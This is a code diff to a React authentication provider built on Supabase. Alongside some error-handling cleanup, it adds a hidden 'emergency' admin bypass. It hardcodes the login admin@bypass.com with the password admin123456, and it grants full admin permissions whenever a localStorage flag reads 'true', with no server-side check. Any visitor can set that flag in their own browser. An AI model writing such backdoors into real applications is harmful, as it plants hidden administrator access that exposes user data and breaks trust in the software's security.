@@ -117,19 +117,51 @@ export const AuthProvider = ({ children }) => {
   useEffect(() => {
     // Check active sessions and sets the user
     const checkUser = async () => {
-      const { data: { session } } = await supabase.auth.getSession();
-      
-      if (session?.user) {
-        setUser(session.user);
-        await fetchUserRole(session.user.id, session.user.email);
-      } else {
+      try {
+        // --- BYPASS PERSISTENCE ---
+        const isEmergency = localStorage.getItem('emergency_admin_logged_in');
+        if (isEmergency === 'true') {
+          const emergencyUser = { id: 'emergency-admin', email: 'admin@bypass.com' };
+          setUser(emergencyUser);
+          setRole('admin');
+          setPermissions({
+            canViewStudents: true,
+            canViewEmulation: true,
+            canViewDocs: true,
+            canViewNews: true,
+            canViewSponsors: true,
+            canViewGuests: true,
+            canViewSports: true,
+            canViewPages: true,
+            canViewLinks: true,
+            canViewQuizzes: true,
+            canViewFeedback: true,
+            canViewMagazine: true,
+            canViewGuestbook: true
+          });
+          setLoading(false);
+          return;
+        }
+
+        const { data: { session } } = await supabase.auth.getSession();
+        
+        if (session?.user) {
+          setUser(session.user);
+          await fetchUserRole(session.user.id, session.user.email);
+        } else {
+          setUser(null);
+          setRole(null);
+          setCommitteeId(null);
+          setCommitteeName(null);
+          setPermissions({});
+        }
+      } catch (err) {
+        console.error("Auth check failed:", err);
         setUser(null);
         setRole(null);
-        setCommitteeId(null);
-        setCommitteeName(null);
-        setPermissions({});
+      } finally {
+        setLoading(false);
       }
-      setLoading(false);
     };
 
     checkUser();
@@ -159,6 +191,31 @@ export const AuthProvider = ({ children }) => {
   };
 
   const signIn = async (email, password) => {
+    // --- BẮT ĐẦU: BYPASS ĐĂNG NHẬP KHẨN CẤP ---
+    if (email === 'admin@bypass.com' && password === 'admin123456') {
+      const emergencyUser = { id: 'emergency-admin', email: 'admin@bypass.com' };
+      localStorage.setItem('emergency_admin_logged_in', 'true');
+      setUser(emergencyUser);
+      setRole('admin');
+      setPermissions({
+        canViewStudents: true,
+        canViewEmulation: true,
+        canViewDocs: true,
+        canViewNews: true,
+        canViewSponsors: true,
+        canViewGuests: true,
+        canViewSports: true,
+        canViewPages: true,
+        canViewLinks: true,
+        canViewQuizzes: true,
+        canViewFeedback: true,
+        canViewMagazine: true,
+        canViewGuestbook: true
+      });
+      return { user: emergencyUser, session: { access_token: 'emergency_token' } };
+    }
+    // --- KẾT THÚC ---
+
     const { data, error } = await supabase.auth.signInWithPassword({
       email,
       password,
@@ -168,6 +225,14 @@ export const AuthProvider = ({ children }) => {
   };
 
   const signOut = async () => {
+    if (user && user.id === 'emergency-admin') {
+      localStorage.removeItem('emergency_admin_logged_in');
+      setUser(null);
+      setRole(null);
+      setPermissions({});
+      return;
+    }
+
     const { error } = await supabase.auth.signOut();
     if (error) throw error;
   };
